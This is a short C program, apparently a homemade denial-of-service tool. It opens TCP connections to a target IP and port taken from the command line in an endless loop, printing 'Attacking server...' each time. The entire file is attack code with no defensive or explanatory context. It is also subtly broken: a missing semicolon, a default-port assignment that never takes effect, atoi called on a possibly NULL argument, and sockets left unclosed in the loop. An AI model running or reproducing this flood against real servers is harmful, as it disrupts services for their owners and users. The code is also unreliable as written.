#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>


int main(int argc, char* argv[]){

   if(argc<2){
      printf("Use mode incorret\n");
      printf("./DoS target port(optional)")
      return 1;
   }

   int mysock;
   int connection;
   char *targ;
   targ = argv[1];
   char *port_in = argv[2];
   int port = atoi(port_in);

   if(argv[2]==NULL){
      int port_in = 21;
   }

   struct sockaddr_in address;

   while(1==1){
      mysock = socket(AF_INET, SOCK_STREAM, 0);
      address.sin_family = AF_INET;
      address.sin_port = htons(port);
      address.sin_addr.s_addr = inet_addr(targ); 

      connection = connect(mysock, (struct sockaddr *)&address, sizeof(address));
   
      printf("Attacking server...\n");

   }

   close(mysock);
   close(connection);

   return 0;
}
